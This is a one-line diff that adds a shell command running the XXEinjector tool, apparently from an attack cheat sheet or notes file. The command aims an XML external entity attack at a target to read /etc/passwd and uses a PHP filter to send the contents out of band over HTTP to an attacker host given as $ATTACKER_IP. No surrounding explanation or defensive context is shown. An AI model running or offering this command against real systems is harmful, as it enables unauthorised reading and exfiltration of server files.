@@ -1,0 +1,1 @@
+XXEinjector.rb --host="$ATTACKER_IP" --file=req.txt --path=/etc/passwd --oob=http --phpfilter --verbose
